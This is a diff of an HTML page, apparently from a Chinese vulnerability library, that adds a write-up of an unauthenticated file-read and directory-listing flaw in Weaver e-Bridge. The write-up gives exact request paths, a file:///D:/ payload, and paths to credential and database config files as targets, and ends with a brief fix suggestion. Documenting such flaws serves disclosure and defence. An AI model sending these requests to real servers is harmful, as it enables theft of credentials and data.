@@ -64,6 +64,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#_1" class="md-skip">
+          跳转至
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -4502,9 +4507,36 @@
     <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
     
     
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        泛微云桥任意文件读取
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+    
     <a href="./" class="md-nav__link md-nav__link--active">
       泛微云桥任意文件读取
     </a>
+    
+      
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    泛微云桥任意文件读取升级玩法。
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
     
   </li>
 
@@ -9946,6 +9978,34 @@
               </div>
             
             
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    泛微云桥任意文件读取升级玩法。
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
           
           <div class="md-content">
             <article class="md-content__inner md-typeset">
@@ -9958,7 +10018,22 @@
                 
                   <h1>泛微云桥任意文件读取</h1>
                 
-                <p><a href="https://www.bylibrary.cn/wp-content/uploads/2020/09/wp_editor_md_696871d7582e2f0b15da1ba6e240951d.jpg"><img alt="" src="https://www.bylibrary.cn/wp-content/uploads/2020/09/wp_editor_md_696871d7582e2f0b15da1ba6e240951d.jpg" /></a> <a href="https://www.bylibrary.cn/wp-content/uploads/2020/09/wp_editor_md_304d517adbbf6f0fe270951073cc1e7d.jpg"><img alt="" src="https://www.bylibrary.cn/wp-content/uploads/2020/09/wp_editor_md_304d517adbbf6f0fe270951073cc1e7d.jpg" /></a></p>
+                <p>未授权任意文件读取,/wxjsapi/saveYZJFile接口获取filepath,返回数据包内出现了程序的绝对路径,攻击者可以通过返回内容识别程序运行路径从而下载数据库配置文件危害可见。
+1、 downloadUrl参数修改成需要获取文件的绝对路径,记录返回包中的id值。
+<img alt="" src="https://mmbiz.qpic.cn/mmbiz_png/gEVuGz7Ip7TLAfCC3eicZeiatLHb6PtFQKpmtXbajxJeCjHCBYqpibImvE1DOSubqOjI9tXr1q5XPibbsFJzsI89RQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" /></p>
+<p>2、通过查看文件接口访问 /file/fileNoLogin/id
+<img alt="" src="https://mmbiz.qpic.cn/mmbiz_png/gEVuGz7Ip7TLAfCC3eicZeiatLHb6PtFQK9pcoRWC2r3Hp58NZx3BPJbmqC0iaKsZ4zBsCiaqNHvK1trtsC0ZQS15g/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" /></p>
+<h2 id="_1">泛微云桥任意文件读取升级玩法。<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>1、简单说说泛微云桥的报告,输入文件路径-&gt;读取文件内容,我们读了一下代码后发现这还能读取文件目录。
+2、参数不填写绝对路径写进文本内容就是当前的目录,产生了一个新的漏洞 “目录遍历”
+/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///D:/&amp;fileExt=txt
+<img alt="" src="https://mmbiz.qpic.cn/mmbiz_png/gEVuGz7Ip7SSJOGRbwFbueTWTmOcwYNpiboItvQI3dQ56siaxTNLicBDh8AuAhnp5wVMYfM3D92IiaYPdpoerYGb2g/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" /></p>
+<p>3、目录遍历+文件读取,我们能做的事情就很多了,比如读取管理员在桌面留下的密码文件、数据库配置文件、nginx代理配置、访问日志、D盘迅雷下载。
+d://ebridge//tomcat//webapps//ROOT//WEB-INF//classes//init.properties
+d:/OA/tomcat8/webapps/OAMS/WEB-INF/classes/dbconfig.properties 泛微OA数据库
+<img alt="" src="https://mmbiz.qpic.cn/mmbiz_png/gEVuGz7Ip7SSJOGRbwFbueTWTmOcwYNpRwROibBRiawD1PPxah8KfzahTdia2ertJZcLibibVbxzvWXSvwUaZnFSByA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" /></p>
+<p>修复建议:
+关闭程序路由 /file/fileNoLogin</p>
                 
                   
                 
